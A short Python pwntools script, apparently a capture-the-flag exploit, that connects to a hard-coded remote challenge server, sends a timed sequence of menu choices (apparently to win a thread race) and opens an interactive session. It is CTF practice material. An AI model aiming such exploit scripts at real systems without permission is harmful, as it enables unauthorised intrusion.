from pwn import * 

context.log_level = 'debug'
# sh = process('./thread.tmp')
sh = remote('119.45.24.140', 9373)

sh.sendline('1')
sleep(0.05)
sh.sendline('10')
sleep(0.05)
sh.sendline('2')
sleep(0.05)
sh.sendline('2')
sleep(0.05)
# sh.sendline('4')


sh.interactive()